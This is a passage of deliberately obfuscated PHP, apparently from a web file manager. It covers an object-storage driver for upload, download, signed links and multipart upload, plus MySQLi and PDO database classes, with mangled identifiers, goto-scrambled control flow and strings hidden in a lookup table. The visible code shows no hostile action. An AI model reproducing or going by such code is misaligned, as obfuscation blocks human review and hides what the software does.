($fÆ“„òÂ’ˆ[$aö×´æà³›[73]] as $a–ŒÁØàöĞ) { $cÎÚŠ–Ô«Ş[$a–ŒÁØàöĞ[$aö×´æà³›[28]]] = $a–ŒÁØàöĞ[$aö×´æà³›[77]]; } foreach ($fÆ“„òÂ’ˆ[$aö×´æà³›[74]] as $a–ŒÁØàöĞ) { if (is_string($a–ŒÁØàöĞ)) { $cÎÚŠ–Ô«Ş[$a–ŒÁØàöĞ] = 0; } } return $this->listAllFiles($cğ–Ê¯¼ôö, array_keys($cÎÚŠ–Ô«Ş), $cÎÚŠ–Ô«Ş); } public function canRead($dÒğŠ—ÙÇ) { $AöœˆÈÒˆŠ =& $_SERVER[ÉóçÄÇ]; $EÕï—–¬ôÁ = $this->client->getAccessControlPolicy($this->bucket, $dÒğŠ—ÙÇ); if (!$EÕï—–¬ôÁ) { return !1; } return in_array($EÕï—–¬ôÁ, array($AöœˆÈÒˆŠ[203], $AöœˆÈÒˆŠ[204], $AöœˆÈÒˆŠ[205])) ? !0 : !1; } public function canWrite($Fáé³îğ‡ó) { $dµî”—¬øÊ =& $_SERVER[ÉóçÄÇ]; $EÃ —„ãÜ¬ = $this->client->getAccessControlPolicy($this->bucket, $Fáé³îğ‡ó); if (!$EÃ —„ãÜ¬) { return !1; } return in_array($EÃ —„ãÜ¬, array($dµî”—¬øÊ[203], $dµî”—¬øÊ[204])) ? !0 : !1; } public function getContent($Bö÷±ˆºõÅ) { return $this->client->getObject($this->bucket, $Bö÷±ˆºõÅ); } public function setContent($C•‹×æÚÆ‘, $b„¡„ßéÙ° = '', $EòÌà³÷©ù = false) { goto dµİµ‰š; dµİµ‰š: $F‰ĞëĞùµÆ =& $_SERVER[ÉóçÄÇ]; $C•‹×æÚÆ‘ = $EòÌà³÷©ù ? trim($C•‹×æÚÆ‘, $F‰ĞëĞùµÆ[8]) . $F‰ĞëĞùµÆ[8] : $C•‹×æÚÆ‘; $a—Ùñ¶Ş¨• = get_file_mime(get_path_ext($C•‹×æÚÆ‘)); goto c™Å—ª†‰È; b¨¹éÕÃ: $this->cacheMethod(null, null); $F…ƒÑ´·Ÿ = $this->copyFile($C•‹×æÚÆ‘, $C•‹×æÚÆ‘, array($F‰ĞëĞùµÆ[206] => $F…ƒÑ´·Ÿ[$F‰ĞëĞùµÆ[207]])); return $F…ƒÑ´·Ÿ ? !0 : !1; goto dà©çéÍÎ; c™Å—ª†‰È: $F…ƒÑ´·Ÿ = $this->client->putObject($b„¡„ßéÙ°, $this->bucket, $C•‹×æÚÆ‘, $F‰ĞëĞùµÆ[191], array(), $a—Ùñ¶Ş¨•); if (!$F…ƒÑ´·Ÿ) { return !1; } if ($EòÌà³÷©ù) { return !0; } goto b¨¹éÕÃ; dà©çéÍÎ: } public function fileSubstr($F®§òºÍÆ®, $AÕš‘à„³, $C‹©ñïÛÃ†) { $cë‹Ş£¢†Ö = $AÕš‘à„³ + $C‹©ñïÛÃ† - 1; return $this->client->getObject($this->bucket, $F®§òºÍÆ®, array($_SERVER[ÉóçÄÇ][208] => "\142\x79\x74\145\163\75{$AÕš‘à„³}\x2d{$cë‹Ş£¢†Ö}")); } public function upload($fÑóäÀÖÌ¬, $EÆ²¾ã‰ˆì, $c¨ç•ƒ§Î = false, $eÔµ—Æî§Ü = REPEAT_REPLACE) { $A‘ÓŠÍˆêë =& $_SERVER[ÉóçÄÇ]; $BšÁ³Ÿ Ää = array($A‘ÓŠÍˆêë[206] => @md5_file($EÆ²¾ã‰ˆì)); $Bã‚„Ï½íŠ = array($A‘ÓŠÍˆêë[209] => get_file_mime(get_path_ext($fÑóäÀÖÌ¬))); if (IO::size($EÆ²¾ã‰ˆì) <= 1024 * 1024 * 200) { $FÙô˜…ÙÓ² = $this->client->putObjectFile($EÆ²¾ã‰ˆì, $this->bucket, $fÑóäÀÖÌ¬, $A‘ÓŠÍˆêë[191], $BšÁ³Ÿ Ää, $Bã‚„Ï½íŠ); return !empty($FÙô˜…ÙÓ²) ? $this->getPathOuter($fÑóäÀÖÌ¬) : !1; } $eóÕ´éÚ¨‹ = $this->client->multiUploadObject($EÆ²¾ã‰ˆì, $this->bucket, trim($fÑóäÀÖÌ¬, $A‘ÓŠÍˆêë[8]), $BšÁ³Ÿ Ää, $Bã‚„Ï½íŠ); return $eóÕ´éÚ¨‹ ? $this->getPathOuter($fÑóäÀÖÌ¬) : !1; } public function download($eà±Öá¤ÇÀ, $c²õ˜Ã¸†Æ) { if (!@is_dir($this->pathFather($c²õ˜Ã¸†Æ)) && !IO::mkdir($this->pathFather($c²õ˜Ã¸†Æ))) { return !1; } $F¦½¤Âæà¾ = $this->client->getObject($this->bucket, $eà±Öá¤ÇÀ, array(), $c²õ˜Ã¸†Æ); return $F¦½¤Âæà¾ !== !1 ? $c²õ˜Ã¸†Æ : !1; } public function link($Dƒôµ¬ÔÕ´, $eŸÃ„¶‚ = array()) { $f°ÔÌ·‘†– =& $_SERVER[ÉóçÄÇ]; if ($this->signVer == $f°ÔÌ·‘†–[210]) { return $this->client->getAuthenticatedURL($this->bucket, $Dƒôµ¬ÔÕ´, 3600 * 12, $eŸÃ„¶‚); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Dƒôµ¬ÔÕ´, $f°ÔÌ·‘†–[8]), 3600 * 12, $this->region, array(), !0, $eŸÃ„¶‚); } public function fileOut($BïËçì¦ö, $AÖ×˜ö¤š‘ = false, $E·âî¢ˆ÷« = false, $cÂÜŞ‰© Ü = '') { goto aì³šÒÄÏó; Cäç„É†ç»: $eôĞÇíœ„ó = get_file_mime(get_path_ext($E·âî¢ˆ÷«)); if ($eôĞÇíœ„ó == $CõÕÇÇğ[211]) { return parent::fileOut($BïËçì¦ö, $AÖ×˜ö¤š‘, $E·âî¢ˆ÷«, $cÂÜŞ‰© Ü); } $AÖ×˜ö¤š‘ = $AÖ×˜ö¤š‘ ? $CõÕÇÇğ[212] : $CõÕÇÇğ[213]; goto eÇÁ®‚’Şƒ; aì³šÒÄÏó: $CõÕÇÇğ =& $_SERVER[ÉóçÄÇ]; if ($this->isFileOutServer()) { return $this->fileOutServer($BïËçì¦ö, $AÖ×˜ö¤š‘, $E·âî¢ˆ÷«, $cÂÜŞ‰© Ü); } if (!$E·âî¢ˆ÷«) { $E·âî¢ˆ÷« = $this->pathThis($BïËçì¦ö); } goto Cäç„É†ç»; eÇÁ®‚’Şƒ: $c•Š“ÍÈ¼· = array($CõÕÇÇğ[214] => $AÖ×˜ö¤š‘ . $CõÕÇÇğ[215] . rawurlencode($E·âî¢ˆ÷«), $CõÕÇÇğ[216] => $eôĞÇíœ„ó); $F‘³‘â«”ä = $this->link($BïËçì¦ö, $c•Š“ÍÈ¼·); $this->fileOutLink($F‘³‘â«”ä); goto E§Ğ“°­ÏÎ; E§Ğ“°­ÏÎ: } public function fileOutServer($eÌÅ•·Õôä, $bù±»Ó¾› = false, $aÂƒØèë‘‹ = false, $f½¢í©»¯œ = '') { parent::fileOut($eÌÅ•·Õôä, $bù±»Ó¾›, $aÂƒØèë‘‹, $f½¢í©»¯œ); } public function fileOutImageServer($EØğ‡èë‰ä, $b¼ï¶Şƒˆ = 250) { parent::fileOutImage($EØğ‡èë‰ä, $b¼ï¶Şƒˆ); } public function hashMd5($Dâ–ËæÍÖ£, $fíÖá¸† = '') { $f‘òÒÇîÕ =& $_SERVER[ÉóçÄÇ]; $AÌ‡‘¬Œ¹É = $this->objectMeta($Dâ–ËæÍÖ£); if (!$AÌ‡‘¬Œ¹É) { return !1; } $fíÖá¸† = $fíÖá¸† ? $fíÖá¸† : _get($AÌ‡‘¬Œ¹É, $f‘òÒÇîÕ[217]); $fíÖá¸† = $fíÖá¸† ? $fíÖá¸† : _get($AÌ‡‘¬Œ¹É, $f‘òÒÇîÕ[207], $f‘òÒÇîÕ[33]); return $fíÖá¸†; } public function uploadFormData($dë˜³ÑØµŒ, $DÜÃ¼¨© = 3600) { $aùìßƒÇÀÅ =& $_SERVER[ÉóçÄÇ]; $fìÖ¬»Ãè = $this->pathFather($dë˜³ÑØµŒ); $b‰ƒ²íĞòƒ = $this->client->getHttpUploadPostParams($this->bucket, $fìÖ¬»Ãè, $aùìßƒÇÀÅ[191], $DÜÃ¼¨©); return array_merge((array) $b‰ƒ²íĞòƒ, array($aùìßƒÇÀÅ[175] => $this->getHost())); } public function multiUploadFormData($b•à¸¾³²”, $dè–æ§«ÍŒ = 3600) { $B¸Ï·º—êÅ =& $_SERVER[ÉóçÄÇ]; $c¢¤‹İ®á· = gmdate($B¸Ï·º—êÅ[218]); $Eå¾¨ºŒ¢ì = array(); $b“Ñ š ¥È = $this->client->getUploadId($this->bucket, $b•à¸¾³²”, $Eå¾¨ºŒ¢ì); if (!$b“Ñ š ¥È) { return !1; } return array($B¸Ï·º—êÅ[219] => $b“Ñ š ¥È, $B¸Ï·º—êÅ[175] => $this->getHost() . $B¸Ï·º—êÅ[8] . $this->pathEncode($b•à¸¾³²”), $B¸Ï·º—êÅ[220] => $c¢¤‹İ®á·, $B¸Ï·º—êÅ[92] => $b•à¸¾³²”); } public function multiUploadAuthData($c÷šÇÖ¸®, $c·•³Õ¢æ = array()) { goto bÍíáÁ‚êö; bÍíáÁ‚êö: $DêÇŸŸ¦í =& $_SERVER[ÉóçÄÇ]; $DíÕ¦èî‘¥ = isset($c·•³Õ¢æ[$DêÇŸŸ¦í[220]]) ? $c·•³Õ¢æ[$DêÇŸŸ¦í[220]] : gmdate($DêÇŸŸ¦í[218]); $cÕíöÇÄ– = isset($c·•³Õ¢æ[$DêÇŸŸ¦í[167]]) ? $c·•³Õ¢æ[$DêÇŸŸ¦í[167]] : $DêÇŸŸ¦í[33]; goto fÃö¿ËŸùÃ; A¤ÙÏ¯¿…·: $a¡Ëó‚êÁ¨ = implode($DêÇŸŸ¦í[227], $E‚Ú¼ˆ¤ĞØ); $d¡ÈàÉºœ¨ = base64_encode(hash_hmac($DêÇŸŸ¦í[228], $a¡Ëó‚êÁ¨, $this->secret, !0)); $cî–¯°’× = $DêÇŸŸ¦í[229] . $this->accessKey . $DêÇŸŸ¦í[4] . $d¡ÈàÉºœ¨; goto a‘Ä‡œøÂ‚; a‘Ä‡œøÂ‚: if (strpos($cÕíöÇÄ–, $DêÇŸŸ¦í[223]) === 0) { return array($DêÇŸŸ¦í[230] => $cî–¯°’×, $DêÇŸŸ¦í[220] => $DíÕ¦èî‘¥); } return $cî–¯°’×; goto e‡†˜®«¤µ; fÃö¿ËŸùÃ: $eĞéÌéÕîº = $c·•³Õ¢æ[$DêÇŸŸ¦í[92]]; unset($c·•³Õ¢æ[$DêÇŸŸ¦í[92]]); if (isset($c·•³Õ¢æ[$DêÇŸŸ¦í[221]])) { $c·•³Õ¢æ[$DêÇŸŸ¦í[220]] = $DíÕ¦èî‘¥; return $this->listUploadParts($eĞéÌéÕîº, $c·•³Õ¢æ); } goto dÚùŠÚ; dÚùŠÚ: $E‚Ú¼ˆ¤ĞØ = array($DêÇŸŸ¦í[222], $DêÇŸŸ¦í[33], $DêÇŸŸ¦í[118], $DêÇŸŸ¦í[33], "\x78\x2d\x61\x6d\172\x2d\x64\141\164\x65\x3a{$DíÕ¦èî‘¥}", $DêÇŸŸ¦í[8] . $this->bucket . $DêÇŸŸ¦í[8] . $this->pathEncode($eĞéÌéÕîº) . $cÕíöÇÄ–); if (strpos($cÕíöÇÄ–, $DêÇŸŸ¦í[223]) === 0) { $E‚Ú¼ˆ¤ĞØ[0] = $DêÇŸŸ¦í[224]; } if (isset($c·•³Õ¢æ[$DêÇŸŸ¦í[225]]) && $c·•³Õ¢æ[$DêÇŸŸ¦í[225]] == $DêÇŸŸ¦í[226]) { $E‚Ú¼ˆ¤ĞØ[0] = $DêÇŸŸ¦í[226]; } goto A¤ÙÏ¯¿…·; e‡†˜®«¤µ: } public function listUploadParts($f•‹­‚ä¯–, $fí¦åçñ„– = array()) { goto fŞÅ³çÖ´; Eƒî§è‰º: if (!$a…ëØ½¡‹¡) { return !1; } unset($fí¦åçñ„–[$A‡ÃÆÛ‹ñ‘[221]], $fí¦åçñ„–[$A‡ÃÆÛ‹ñ‘[225]]); $fí¦åçñ„–[$A‡ÃÆÛ‹ñ‘[92]] = $f•‹­‚ä¯–; goto c’ïÙøø÷; c’ïÙøø÷: $Bİ–äÖ¡Ÿ¡ = $this->multiUploadAuthData($f•‹­‚ä¯–, $fí¦åçñ„–); if (empty($Bİ–äÖ¡Ÿ¡)) { return !1; } return array($A‡ÃÆÛ‹ñ‘[230] => $Bİ–äÖ¡Ÿ¡, $A‡ÃÆÛ‹ñ‘[220] => $fí¦åçñ„–[$A‡ÃÆÛ‹ñ‘[220]], $A‡ÃÆÛ‹ñ‘[232] => $a…ëØ½¡‹¡); goto B×‘ªåš³Š; fŞÅ³çÖ´: $A‡ÃÆÛ‹ñ‘ =& $_SERVER[ÉóçÄÇ]; $F¡ï÷˜ÎÌğ = str_replace($A‡ÃÆÛ‹ñ‘[231], $A‡ÃÆÛ‹ñ‘[33], $fí¦åçñ„–[$A‡ÃÆÛ‹ñ‘[167]]); $a…ëØ½¡‹¡ = $this->client->listParts($this->bucket, $f•‹­‚ä¯–, $F¡ï÷˜ÎÌğ); goto Eƒî§è‰º; B×‘ªåš³Š: } public function getHost() { return parent::getHost() . $_SERVER[ÉóçÄÇ][8] . $this->bucket; } public function size($d±·ø™˜¼) { $a†À—íÆ¾Ù = $this->objectMeta($d±·ø™˜¼); return $a†À—íÆ¾Ù ? $a†À—íÆ¾Ù[$_SERVER[ÉóçÄÇ][77]] : 0; } public function info($e¿‡Ì‰²åä) { if ($this->isFolder($e¿‡Ì‰²åä)) { return $this->folderInfo($e¿‡Ì‰²åä); } else { if ($this->isFile($e¿‡Ì‰²åä)) { return $this->fileInfo($e¿‡Ì‰²åä); } } return !1; } public function exist($b†•ÅÓÆÂ) { return $this->isFile($b†•ÅÓÆÂ) || $this->isFolder($b†•ÅÓÆÂ); } public function isFile($fí²¢ŞÊî¹) { return !$this->isFolder($fí²¢ŞÊî¹) && $this->objectMeta($fí²¢ŞÊî¹); } public function isFolder($a³ˆ£¾„»í) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][197], $a³ˆ£¾„»í); } protected function objectMeta($aè…À„â¦ª) { return $this->cacheMethod($_SERVER[ÉóçÄÇ][198], $aè…À„â¦ª); } protected function _objectMeta($FÁ›ºÖÂŒ˜) { $aóä—°ë‚à =& $_SERVER[ÉóçÄÇ]; $FÁ›ºÖÂŒ˜ = rtrim($FÁ›ºÖÂŒ˜, $aóä—°ë‚à[8]); try { $dœ¦ËÂ†Ëİ = $this->client->getObjectInfo($this->bucket, $FÁ›ºÖÂŒ˜); if (!isset($dœ¦ËÂ†Ëİ[$aóä—°ë‚à[217]]) && isset($dœ¦ËÂ†Ëİ[$aóä—°ë‚à[233]])) { $dœ¦ËÂ†Ëİ[$aóä—°ë‚à[217]] = $dœ¦ËÂ†Ëİ[$aóä—°ë‚à[233]]; } } catch (Exception $A¿¬“ø¦İ) { $dœ¦ËÂ†Ëİ = !1; } if (!$dœ¦ËÂ†Ëİ) { } return $dœ¦ËÂ†Ëİ; } protected function _isFolder($e’êÉ¢½ÕÃ) { goto A®…£’¦¸; FÆê„ÂÛœ: $Cß›±šàŸ¿ = $this->client->getBucket($this->bucket, $e’êÉ¢½ÕÃ, null, 1); if (empty($Cß›±šàŸ¿[$E…Ò§×ŸŞ­[196]])) { return !1; } $Eã…êÂÛø = $Cß›±šàŸ¿[$E…Ò§×ŸŞ­[196]][0][$E…Ò§×ŸŞ­[28]]; goto eáƒÔŸ’Û; eáƒÔŸ’Û: if (substr($Eã…êÂÛø, -1) == $E…Ò§×ŸŞ­[8]) { return !0; } if (get_path_this($Eã…êÂÛø) == get_path_this($e’êÉ¢½ÕÃ)) { return !1; } return !0; goto F‡÷Ü‹½¥; A®…£’¦¸: $E…Ò§×ŸŞ­ =& $_SERVER[ÉóçÄÇ]; $e’êÉ¢½ÕÃ = rtrim($e’êÉ¢½ÕÃ, $E…Ò§×ŸŞ­[8]); if ($e’êÉ¢½ÕÃ == $E…Ò§×ŸŞ­[33] || $e’êÉ¢½ÕÃ == $E…Ò§×ŸŞ­[8]) { return !0; } goto FÆê„ÂÛœ; F‡÷Ü‹½¥: } } define($_SERVER[ÉóçÄÇ][234], 1); goto F¤ÏùèìÂ; F¤ÏùèìÂ: define($_SERVER[ÉóçÄÇ][235], 2); define($_SERVER[ÉóçÄÇ][236], 3); define($_SERVER[ÉóçÄÇ][237], 1); goto Cà¢¾ÏµƒÕ; fáƒøè÷®: class DbMysqli extends Db { public function __construct($DÈ‚–ùÑì† = '') { $D©ÒÌ›¥í½ =& $_SERVER[ÉóçÄÇ]; if (!extension_loaded($D©ÒÌ›¥í½[750])) { think_exception(think_lang($D©ÒÌ›¥í½[10]) . $D©ÒÌ›¥í½[854]); } if (!empty($DÈ‚–ùÑì†)) { $this->config = $DÈ‚–ùÑì†; if (empty($this->config[$D©ÒÌ›¥í½[13]])) { $this->config[$D©ÒÌ›¥í½[13]] = $D©ÒÌ›¥í½[33]; } } } public function connect($Bİ×¨»Â¤° = '', $EŸ…Â’ƒÇ = 0) { $f–¹·Òé¿È =& $_SERVER[ÉóçÄÇ]; if (!isset($this->linkID[$EŸ…Â’ƒÇ])) { goto a¤¾»Ü„; a¤¾»Ü„: if (empty($Bİ×¨»Â¤°)) { $Bİ×¨»Â¤° = $this->config; } $this->linkID[$EŸ…Â’ƒÇ] = new mysqli($Bİ×¨»Â¤°[$f–¹·Òé¿È[828]], $Bİ×¨»Â¤°[$f–¹·Òé¿È[830]], $Bİ×¨»Â¤°[$f–¹·Òé¿È[831]], $Bİ×¨»Â¤°[$f–¹·Òé¿È[17]], $Bİ×¨»Â¤°[$f–¹·Òé¿È[829]] ? intval($Bİ×¨»Â¤°[$f–¹·Òé¿È[829]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto aİœ—Öîâİ; aİœ—Öîâİ: $AªÑö£Ìí· = $this->linkID[$EŸ…Â’ƒÇ]->server_version; $this->linkID[$EŸ…Â’ƒÇ]->query($f–¹·Òé¿È[832] . think_config($f–¹·Òé¿È[833]) . $f–¹·Òé¿È[55]); if ($AªÑö£Ìí· > $f–¹·Òé¿È[834]) { $this->linkID[$EŸ…Â’ƒÇ]->query($f–¹·Òé¿È[835]); } goto A¢ÂëÏÕ; A¢ÂëÏÕ: $this->connected = !0; if (1 != think_config($f–¹·Òé¿È[18])) { unset($this->config); } goto f‡øö÷Ûš; f‡øö÷Ûš: } return $this->linkID[$EŸ…Â’ƒÇ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($a‘æƒÙ‹¡ˆ) { goto c¤ï¬¦†º; b†­†è¼¿Ã: $this->queryStr = $a‘æƒÙ‹¡ˆ; if ($this->queryID) { $this->free(); } think_action_status($E®‡©åÆÁÍ[19], 1); goto EÀ¤ÛÀÏ™é; c¤ï¬¦†º: $E®‡©åÆÁÍ =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b†­†è¼¿Ã; fì«Úª§£: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto cù«’‘ñ; EÀ¤ÛÀÏ™é: think_status($E®‡©åÆÁÍ[20]); $this->queryID = $this->_linkID->query($a‘æƒÙ‹¡ˆ); if ($this->_linkID->more_results()) { while (($a¥íÍÚÁµ = $this->_linkID->next_result()) != NULL) { $a¥íÍÚÁµ->free_result(); } } goto fì«Úª§£; cù«’‘ñ: } public function execute($B·ÄšŒ¬ƒŞ) { goto bßÖ¤¸‚æ; bßÖ¤¸‚æ: $aÎ ê¡ºŒ× =& $_SERVER[ÉóçÄÇ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c¦Ê®„——Ş; c¦Ê®„——Ş: $this->queryStr = $B·ÄšŒ¬ƒŞ; if ($this->queryID) { $this->free(); } think_action_status($aÎ ê¡ºŒ×[21], 1); goto aØÁ†£ö´…; aØÁ†£ö´…: think_status($aÎ ê¡ºŒ×[20]); $Dİ¯éØ” = $this->_linkID->query($B·ÄšŒ¬ƒŞ); $this->debug(); goto cÃ¦ÜÕÔã÷; cÃ¦ÜÕÔã÷: if (!1 === $Dİ¯éØ”) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto Bã‚Àƒ‚ÀØ; Bã‚Àƒ‚ÀØ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EØÙ¨ĞÖ¤ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$EØÙ¨ĞÖ¤) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aÇ¿÷ È¾‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$aÇ¿÷ È¾‡) { $this->error(); return !1; } } return !0; } private function getAll() { $fÓœØÆÜŸÕ = array(); if ($this->numRows > 0) { for ($A¥½˜¦†Ó² = 0; $A¥½˜¦†Ó² < $this->numRows; $A¥½˜¦†Ó²++) { $fÓœØÆÜŸÕ[$A¥½˜¦†Ó²] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $fÓœØÆÜŸÕ; } public function getFields($F±ãå© ”) { $AØŸŸùÜ«³ =& $_SERVER[ÉóçÄÇ]; $e£ïµÍÅ•¨ = $this->query($AØŸŸùÜ«³[839] . $this->parseKey($F±ãå© ”)); $eÕÇÛ²Œ‘ = array(); if ($e£ïµÍÅ•¨) { foreach ($e£ïµÍÅ•¨ as $eÈŞéÙ—†“ => $D×­ªÇµ¥š) { $eÕÇÛ²Œ‘[$D×­ªÇµ¥š[$AØŸŸùÜ«³[27]]] = array($AØŸŸùÜ«³[28] => $D×­ªÇµ¥š[$AØŸŸùÜ«³[27]], $AØŸŸùÜ«³[29] => $D×­ªÇµ¥š[$AØŸŸùÜ«³[30]], $AØŸŸùÜ«³[31] => (bool) ($D×­ªÇµ¥š[$AØŸŸùÜ«³[32]] === $AØŸŸùÜ«³[33]), $AØŸŸùÜ«³[34] => $D×­ªÇµ¥š[$AØŸŸùÜ«³[35]], $AØŸŸùÜ«³[36] => strtolower($D×­ªÇµ¥š[$AØŸŸùÜ«³[37]]) == $AØŸŸùÜ«³[38], $AØŸŸùÜ«³[39] => strtolower($D×­ªÇµ¥š[$AØŸŸùÜ«³[40]]) == $AØŸŸùÜ«³[41]); } } return $eÕÇÛ²Œ‘; } public function getTables($f·×Çø–ì¥ = '') { $a‡ƒ•íŒŞ =& $_SERVER[ÉóçÄÇ]; $c®‡ÁÚìá» = !empty($f·×Çø–ì¥) ? $a‡ƒ•íŒŞ[841] . $f·×Çø–ì¥ . $a‡ƒ•íŒŞ[842] : $a‡ƒ•íŒŞ[843]; $c–õ†ëù· = $this->query($c®‡ÁÚìá»); $f–Áè£‡Ÿ = array(); if ($c–õ†ëù·) { foreach ($c–õ†ëù· as $ešÉÌËâñå => $dõ„ğ) { $f–Áè£‡Ÿ[$ešÉÌËâñå] = current($dõ„ğ); } } return $f–Áè£‡Ÿ; } public function replace($e³ÖÌ‚ĞÇÖ, $C¨ƒÜ±Ö– = array()) { $BŠò¥¹§„¼ =& $_SERVER[ÉóçÄÇ]; foreach ($e³ÖÌ‚ĞÇÖ as $bÖ¦¥“ÈÇÀ => $c‰¥µ¦°Ÿ—) { $a´é“Ûôø‘ = $this->parseValue($c‰¥µ¦°Ÿ—); if (is_scalar($a´é“Ûôø‘)) { $CéîÓß·Ú†[] = $a´é“Ûôø‘; $Cò›Œ ‰Ø…[] = $this->parseKey($bÖ¦¥“ÈÇÀ); } } $fÚâñŒ® = $BŠò¥¹§„¼[844] . $this->parseTable($C¨ƒÜ±Ö–[$BŠò¥¹§„¼[275]]) . $BŠò¥¹§„¼[845] . implode($BŠò¥¹§„¼[47], $Cò›Œ ‰Ø…) . $BŠò¥¹§„¼[846] . implode($BŠò¥¹§„¼[47], $CéîÓß·Ú†) . $BŠò¥¹§„¼[847]; return $this->execute($fÚâñŒ®); } public function insertAll($f¢æ³µõ¹¾, $AÃ÷ĞÉãÕÁ = array(), $FÕ‘Óó¤š„ = false) { goto cƒãĞµÔÔ ; cƒãĞµÔÔ : $DéÜ’‹ÊÏ¯ =& $_SERVER[ÉóçÄÇ]; if (!is_array($f¢æ³µõ¹¾[0])) { return !1; } $a‚§È‰– = array_keys($f¢æ³µõ¹¾[0]); goto a„ó¢´Âˆ; eœÙ‹ŸÓĞÃ: $CäÀÇ ¾¸– = $FÕ‘Óó¤š„ ? $DéÜ’‹ÊÏ¯[849] : $DéÜ’‹ÊÏ¯[850]; $eßÊÎÈàò“ = $CäÀÇ ¾¸– . $DéÜ’‹ÊÏ¯[851] . $this->parseTable($AÃ÷ĞÉãÕÁ[$DéÜ’‹ÊÏ¯[275]]) . $DéÜ’‹ÊÏ¯[845] . implode($DéÜ’‹ÊÏ¯[47], $a‚§È‰–) . $DéÜ’‹ÊÏ¯[852] . implode($DéÜ’‹ÊÏ¯[47], $CƒÖ­íîˆ©); return $this->execute($eßÊÎÈàò“); goto EŒ‹Ş‹ÎŞù; a„ó¢´Âˆ: $CƒÖ­íîˆ© = array(); foreach ($f¢æ³µõ¹¾ as $bÇò‹á£ê¶) { $d¬Š°ˆÛ±˜ = array(); foreach ($bÇò‹á£ê¶ as $c•Ôê´ñ‘— => $FïËå¦‘³¯) { $FïËå¦‘³¯ = $this->parseValue($FïËå¦‘³¯); if (is_scalar($FïËå¦‘³¯)) { $d¬Š°ˆÛ±˜[] = $FïËå¦‘³¯; } } $CƒÖ­íîˆ©[] = $DéÜ’‹ÊÏ¯[256] . implode($DéÜ’‹ÊÏ¯[47], $d¬Š°ˆÛ±˜) . $DéÜ’‹ÊÏ¯[847]; } array_walk($a‚§È‰–, array($this, $DéÜ’‹ÊÏ¯[848])); goto eœÙ‹ŸÓĞÃ; EŒ‹Ş‹ÎŞù: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $C¿‰ø˜¥«³ =& $_SERVER[ÉóçÄÇ]; $this->error = $this->_linkID->errno . $C¿‰ø˜¥«³[4] . $this->_linkID->error; if ($C¿‰ø˜¥«³[33] != $this->queryStr) { $this->error .= LNG($C¿‰ø˜¥«³[45]) . $this->queryStr; } think_trace($this->error, $C¿‰ø˜¥«³[33], $C¿‰ø˜¥«³[46]); return $this->error; } public function escapeString($d“¥Æ¤¯é) { if ($this->_linkID) { return $this->_linkID->real_escape_string($d“¥Æ¤¯é); } else { return addslashes($d“¥Æ¤¯é); } } public function parseKey(&$aàØ©ëÃ, $Dôš¨¤¼óñ = true) { $cÒ‰Ş„ù†á =& $_SERVER[ÉóçÄÇ]; if ($Dôš¨¤¼óñ) { $aàØ©ëÃ = $this->parseKeyCheck($aàØ©ëÃ); } if ($aàØ©ëÃ != $cÒ‰Ş„ù†á[182] && !preg_match($cÒ‰Ş„ù†á[853], $aàØ©ëÃ)) { $aàØ©ëÃ = $cÒ‰Ş„ù†á[380] . trim($aàØ©ëÃ, $cÒ‰Ş„ù†á[380]) . $cÒ‰Ş„ù†á[380]; } return $aàØ©ëÃ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($D×˜¼¥†¿ = '') { $Fâ´åŠÖ‚Õ =& $_SERVER[ÉóçÄÇ]; if (!class_exists($Fâ´åŠÖ‚Õ[855])) { think_exception(think_lang($Fâ´åŠÖ‚Õ[10]) . $Fâ´åŠÖ‚Õ[856]); } if (!empty($D×˜¼¥†¿)) { $this->config = $D×˜¼¥†¿; if (empty($this->config[$Fâ´åŠÖ‚Õ[13]])) { $this->config[$Fâ´åŠÖ‚Õ[13]] = array(); } } } public function connect($Aê‰¨â…’Œ = '', $BùéÑ¼ÅÅ± = 0) { $b‡ƒ²ĞôÀ =& $_SERVER[ÉóçÄÇ]; if (!isset($this->linkID[$BùéÑ¼ÅÅ±])) { goto cåš×ù¤š; b–å”°Ò: if (!$this->linkID[$BùéÑ¼ÅÅ±]) { think_exception($b‡ƒ²ĞôÀ[865]); } try { $this->linkID[$BùéÑ¼ÅÅ±]->exec($b‡ƒ²ĞôÀ[866] . think_config($b‡ƒ²ĞôÀ[833])); } catch (Exception $bÓ£êŒÔ¢) { } $this->connected = !0; goto aáŸê­…¿¨; CÚÕÖ Øâå: try { $this->linkID[$BùéÑ¼ÅÅ±] = new PDO($Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[857]], $Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[830]], $Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[831]], $Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[13]]); } catch (PDOException $bÓ£êŒÔ¢) { think_exception($bÓ£êŒÔ¢->getMessage()); } $this->dbType = $this->_getDsnType($Aê‰¨â…’Œ[$b‡ƒ²ĞôÀ[857]]); if (in_array($this->dbType, array($b‡ƒ²ĞôÀ[858], $b‡ƒ²ĞôÀ[859], $b‡ƒ²ĞôÀ[860], $b‡ƒ²ĞôÀ[861]))) { think_exception($b‡ƒ²ĞôÀ[862] . $this->dbType . $b‡ƒ²ĞôÀ[863] . $this->dbType . $b‡ƒ²ĞôÀ[864]); } goto b–å”°Ò; cåš×ù¤š: if (empty($Aê‰¨â…’Œ)) { $Aê‰¨â…’Œ = $this->config; } $aÓ·¡ªğĞ = 